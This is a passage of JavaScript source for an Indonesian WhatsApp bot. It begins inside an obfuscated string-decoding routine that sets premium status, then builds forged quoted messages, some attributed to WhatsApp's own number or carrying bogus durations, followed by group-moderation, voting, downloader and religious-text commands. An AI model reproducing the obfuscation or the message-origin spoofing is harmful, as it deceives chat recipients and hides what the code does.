_0x188dbf=0x0,_0x21d0fb,_0xe92d9e,_0x1aae6b=0x0;_0xe92d9e=_0x3636f4['charAt'](_0x1aae6b++);~_0xe92d9e&&(_0x21d0fb=_0x188dbf%0x4?_0x21d0fb*0x40+_0xe92d9e:_0xe92d9e,_0x188dbf++%0x4)?_0xa6431a+=String['fromCharCode'](0xff&_0x21d0fb>>(-0x2*_0x188dbf&0x6)):0x0){_0xe92d9e=_0x1e2d29['indexOf'](_0xe92d9e);}for(var _0x2ed0b8=0x0,_0x3d7ea4=_0xa6431a['length'];_0x2ed0b8<_0x3d7ea4;_0x2ed0b8++){_0x50e143+='%'+('00'+_0xa6431a['charCodeAt'](_0x2ed0b8)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x50e143);};var _0x4f4c63=function(_0x560d3a,_0x34981e){var _0x5ebdd9=[],_0x5987d4=0x0,_0x13396d,_0x2bad56='';_0x560d3a=_0x3e38db(_0x560d3a);var _0x59a7bc;for(_0x59a7bc=0x0;_0x59a7bc<0x100;_0x59a7bc++){_0x5ebdd9[_0x59a7bc]=_0x59a7bc;}for(_0x59a7bc=0x0;_0x59a7bc<0x100;_0x59a7bc++){_0x5987d4=(_0x5987d4+_0x5ebdd9[_0x59a7bc]+_0x34981e['charCodeAt'](_0x59a7bc%_0x34981e['length']))%0x100,_0x13396d=_0x5ebdd9[_0x59a7bc],_0x5ebdd9[_0x59a7bc]=_0x5ebdd9[_0x5987d4],_0x5ebdd9[_0x5987d4]=_0x13396d;}_0x59a7bc=0x0,_0x5987d4=0x0;for(var _0x32229d=0x0;_0x32229d<_0x560d3a['length'];_0x32229d++){_0x59a7bc=(_0x59a7bc+0x1)%0x100,_0x5987d4=(_0x5987d4+_0x5ebdd9[_0x59a7bc])%0x100,_0x13396d=_0x5ebdd9[_0x59a7bc],_0x5ebdd9[_0x59a7bc]=_0x5ebdd9[_0x5987d4],_0x5ebdd9[_0x5987d4]=_0x13396d,_0x2bad56+=String['fromCharCode'](_0x560d3a['charCodeAt'](_0x32229d)^_0x5ebdd9[(_0x5ebdd9[_0x59a7bc]+_0x5ebdd9[_0x5987d4])%0x100]);}return _0x2bad56;};_0x3636['IJUxsG']=_0x4f4c63,_0x44784f=arguments,_0x3636['LhZnEB']=!![];}var _0x19a017=_0x1e53[0x0],_0x1e7a30=_0x1e53da+_0x19a017,_0x422d23=_0x44784f[_0x1e7a30];return!_0x422d23?(_0x3636['GPjULG']===undefined&&(_0x3636['GPjULG']=!![]),_0x15b520=_0x3636['IJUxsG'](_0x15b520,_0x36a3e6),_0x44784f[_0x1e7a30]=_0x15b520):_0x15b520=_0x422d23,_0x15b520;},_0x3636(_0x44784f,_0xe39316);}var prema=_0x28cf39(-0x102,-0x105);function _0x28cf39(_0x3fdedb,_0x5971e1){return _0x36a3(_0x3fdedb- -0x19d,_0x5971e1);}function _0x1c18e1(_0x288910,_0x5a3d77){return _0x36a3(_0x288910-0x12f,_0x5a3d77);}isOwner&&(prema=_0x28cf39(-0x10d,-0x110));isDev&&(prema=_0x28cf39(-0x101,-0x109));
        //MESS
		mess = {
			wait: '_Tunggu sebentar ya kak_',
			admin: '_Kusus admin_',
			owner: '_Kusus owner_',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Khusus grup ngab',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        //FAKEREPLY PRODUCT
            const ftoko = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./stik/thumb.jpeg`)},"title": `NGEJUDI GAK BROH?\n${pushname}`,"description": "X -Dev Team", "currencyCode": "IDR","priceAmount1000": "9999999999","retailerId": "ID Team","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
            //FAKE KONTAK
            const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
            const fvn = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds": "9999999","ptt": "true"}}}
            //FAKE TEXT
            const ftext = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${fake}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE LIVE ACTION
            const floc2 = {
                  key: {"fromMe": false,"participant": `0@s.whatsapp.net`, "remoteJid": "6289530863358-1621036495@g.us" },message: { "liveLocationMessage": { "title":`${fake}`,}}}
            //FAKEREPLY TROLI
            const ftroli = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 1,message: `${fake}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/thumb.jpeg'), sellerJid: '0@s.whatsapp.net'}}}
            //FAKEREPLY VIDEO
            const fvideo = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '-99999', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GROUPINVITE
            const fgc = {
                  key: {"fromMe": false,"participant": "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62895619083555-1616169743@g.us","inviteCode": "mememteeeekkeke","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKEREPLY GIF
            const fgif = {
                  key: {fromMe: false,participant: `62895619083555@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":"hallo bang","h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `${fake}`,'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}} 
            
        const reply = (text) => {
                idteam.sendMessage(from, text, MessageType.text, {contextInfo:{forwardingScore: 508, isForwarded: true}, quoted: dev, sendEphemeral: true ,thumbnail: fs.readFileSync(`./stik/thumb.jpeg`)})
        }
        const sendMess = (hehe, teks) => {
            idteam.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? idteam.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : idteam.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            idteam.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            idteam.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted:dev,caption:yes})
        }
        const fakegroup = (teks) => {
            idteam.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        idteam.sendMessage(to, media, MessageType.sticker,{quoted:dev})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    idteam.sendMessage(to, media, type, { quoted: dev, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
            

            var chats = await idteam.chats.array.filter(v => v.jid.endsWith('g.us'))
            chats.map( async ({ jid }) => {
            await idteam.chatRead(jid)
            })
            //AUTO RESPON
      for (let i = 0; i < commandsDB.length ; i++) {
      if (budy == commandsDB[i].pesan) {
      idteam.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
      }
      }
            /////***𝙁𝙐𝙉𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄𝙇𝙄𝙉𝙆 𝙂𝙍𝙐𝙋***\\\\\
				if (budy.includes("https://chat.whatsapp.com/")) {
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup :(`)
				setTimeout(() => {
				idteam.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 0)
			    }
			/////***𝙁𝙐𝙉𝙏𝙄𝙊𝙉 𝘼𝙉𝙏𝙄 𝙑𝙄𝙍𝙐𝙎***\\\\\
    if (budy.length > 3500) {
    if (!isGroup) return
    if (!AntiVirtex) return
    if (isGroupAdmins) return
    reply('Tandai telah dibaca\n'.repeat(300))
    reply(`「 *PETUGAS PEMBERSIH* 」\n\nKamu nakal si! Ngapain kirim virus? \nMaaf tapi aku harus mengeluarkan kamu...\nSelamat tingal~`)
    console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
    idteam.groupRemove(from, [sender])
    }
//FUNCTION
            cekafk(afk)
            if (!dev.key.remoteJid.endsWith('@g.us') && offline){
            if (!dev.key.fromMe){
            if (isAfk(dev.key.remoteJid)) return
            addafk(dev.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            idteam.sendMessage(dev.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (dev.key.remoteJid.endsWith('@g.us') && offline) {
        if (!dev.key.fromMe){
        if (dev.message.extendedTextMessage != undefined){
        if (dev.message.extendedTextMessage.contextInfo != undefined){
        if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(dev.key.remoteJid)) return
        addafk(dev.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        idteam.sendMessage(dev.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    
    // Yang Respon Itu Bang
   
    if (setiker.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
	idteam.sendMessage(from, buffer, sticker, {quoted:dev })
	}
	
	if (audionye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
	idteam.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: dev, ptt: true })
	}
	
	if (imagenye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/foto/${namastc}jpeg`)
	idteam.sendMessage(from, buffer, image, {quoted : dev})
	}
	
	if (videonye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
	idteam.sendMessage(from, buffer, video, {quoted : dev})
	}
	
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!isOwner) return
if (chatss.toLowerCase().startsWith('unbanchat')){
if (!isBanchat) return reply(`udah di UnBan`)
let anu = bancht.indexOf(from)
bancht.splice(anu, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah di Unban di group ini`)
}
}
	
	
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
	    if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	
        if (!dev.key.fromMe && !isOwner && banChats === true) return

const atibot = dev.isBaileys
if (atibot === true) return

switch (command) {
    case 'menu':
    case 'help':
    const timestampp = speed();
	const latensii = speed() - timestampp
	run = process.uptime() 
    teks = `${kyun(run)}`
    try {
pic = await idteam.getProfilePicture(sender)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
gambar = await getBuffer(pic)
mhan = await idteam.prepareMessage(from, gambar, image, {thumbnail: gambar})
gbutsan = [
  {buttonId: 'CREATOR', buttonText: {displayText: 'CREATOR'}, type: 1},
  {buttonId: 'GITHUB', buttonText: {displayText: 'GITHUB'}, type: 1},
  {buttonId: 'REST API TEAM', buttonText: {displayText: 'REST API'}, type: 1}
]
 gbuttonan = {
imageMessage: mhan.message.imageMessage,
    contentText: help.menu(pushname, sender, prefix, banChats, ucapanWaktu, timeWib, timeWit, timeWita, prema),
    footerText: `Status : ${prema}\nSpeed    : ${latensii.toFixed(4)} Second\nRuntime : ${teks}\n\n𝑪𝑹𝑬𝑨𝑻𝑶𝑹 𝑩𝑶𝑻 𝑾𝑯𝑨𝑻𝑺𝑨𝑷𝑷\n© ID 𝑻𝒆𝒂𝒎`,
    buttons: gbutsan,
    headerType: 4
}
await idteam.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./stik/fake.jpeg'),
        caption: help.menu(pushname, sender, prefix, banChats, ucapanWaktu, timeWib, timeWit, timeWita, prema),
        "contextInfo": {
            mentionedJid: [sender]},
            quoted: ftroli})
           	break
    case 'delvote':
            if(!dev.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !dev.key.fromMe) return 
            if(!isGroup) return reply(mess.only.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (dev.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || dev.message.extendedTextMessage.contextInfo == null) {
            let id = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
    case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
    case 'igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    idteam.sendMessage(from,link,video,{quoted: dev,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    idteam.sendMessage(from,link,image,{quoted: dev,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await idteam.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await idteam.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            idteam.sendMessage(from,ram,image,{quoted:dev,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
            case 'asmaulhusna':
anu = await fetchJson(`https://idteam-api.herokuapp.com/muslim/asmaulhusna`)
				   for (let o of anu.result.data) {
					  teks += `*${o.latin}*\n*Arab:* ${o.arabic}\n*Latin:* ${o.translation_id}\n=============================\n`
				   }
				   reply(teks)
            break

case 'kisahnabi':
if (!q) return reply(`Example: ${prefix + command} kisahnabi muhammad`)
get_result = await fetchJson(`https://idteam-api.herokuapp.com/kisahnabi?nabi=${q}`)
                    get_result = get_result.result.nabi
                    ini_txt = `Nabi : ${get_result.nabi}\n`
                    ini_txt += `Lahir : ${get_result.lahir}\n`
                    ini_txt += `Umur : ${get_result.umur}\n`
                    ini_txt += `Tempat : ${get_result.tempat}`
ini_txt += `Kisah : ${get_result.kisah}`
                    reply(ini_txt)
                     break

case 'doaharian':
anu = await fetchJson(`https://idteam-api.herokuapp.com/muslim/doaharian`)
				   teks = `*◪* *DOA HARIAN*\n\n`
				   for (let ei of anu.result.data) {
					  teks += `*${ei.title}*\n*Arab:* ${ei.arabic}\n*Latin:* ${ei.latin}\n*Terjemah:* ${ei.translation}\n=============================\n`
				   }
				   reply(teks)
            break

case 'ayatkursi':
anu = await fetchJson(`https://idteam-api.herokuapp.com/muslim/ayatkursi`)
				    oi = anu.result.data
					teks = `*◪* *AYAT KURSI*\n\n*Arab:* ${oi.arabic}\n*Latin:* ${oi.latin}\n*Terjemah:* ${oi.translation}`
				   reply(teks)
             break

case 'bacaanshalat':
anu = await fetchJson(`https://idteam-api.herokuapp.com/muslim/bacaanshalat`)
				   teks = `*╔❏* *BACAAN SHALAT*\n\n`
				   for (let ui of anu.result) {
					  teks += `*${ui.name}*\n*Arab:* ${ui.arabic}\n*Latin:* ${ui.latin}\n*Terjemah:* ${ui.terjemahan}\n=============================\n`
				   }
				   reply(teks)
             break
             case 'hadist':
             if (!q) return reply(`contoh ${prefix}hadist bukhari|52`)
var teks = body.slice(8)
                       t1 = teks.split('|')[0]
                       t2 = teks.split('|')[1]
get_result = await fetchJson(`https://idteam-api.herokuapp.com/hadits?kitab=${t1}&nomor=${t2}`)
                    get_result = get_result.result
                    ini_txt = `Judul : ${get_result.message}\n`
                    ini_txt += `Nama : ${get_result.data.name}\n`
                    ini_txt += `id : ${get_result.data.id}\n`
                    ini_txt += `Available : ${get_result.data.available}`
ini_txt += `Nomor : ${get_result.data.contents.number}\n`
ini_txt += `Arab : ${get_result.data.contents.arab}\n`
ini_txt += `Latin : ${get_result.data.contents.id}`
                    reply(ini_txt)
break
case 'tahlil':
anu = await fetchJson(`https://idteam-api.herokuapp.com/muslim/tahlil`)
				   for (let io of anu.result.data) {
					  teks += `*${io.latin}*\n*title:* ${io.title}\n*arabic:* ${io.arabic}\n=============================\n`
				   }
				   reply(teks)
				break
				case 'doawirid':
anu = await fetchJson(`https://idteam-api.herokuapp.com/muslim/wirid`)
				   for (let op of anu.result.data) {
					  teks += `*${op.id}*\n*Arab:* ${op.times}\n*Latin:* ${op.arabic}\n=============================\n`
				   }
				   reply(teks)
				break
				case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://idteam-api.herokuapp.com/jsholat?daerah=${daerah}`)
                    get_result = get_result.jadwal
                    ini_txt = `Wilayah : ${daerah}\n`
                    ini_txt += `Sahur : ${get_result.Fajr}\n`
                    ini_txt += `Imsak : ${get_result.Imsak}\n`
                    ini_txt += `Subuh : ${get_result.Fajr}\n`
                    ini_txt += `Terbit : ${get_result.Sunrise}\n`
                    ini_txt += `Dzuhur : ${get_result.Dhuhr}\n`
                    ini_txt += `Ashar : ${get_result.Asr}\n`
                    ini_txt += `Maghrib : ${get_result.Maghrib}\n`
                    ini_txt += `Isya : ${get_result.Isha}`
                    reply(ini_txt)
                    break
                    case 'niatsholat':
anu = await fetchJson(`https://idteam-api.herokuapp.com/muslim/niatshalat`)
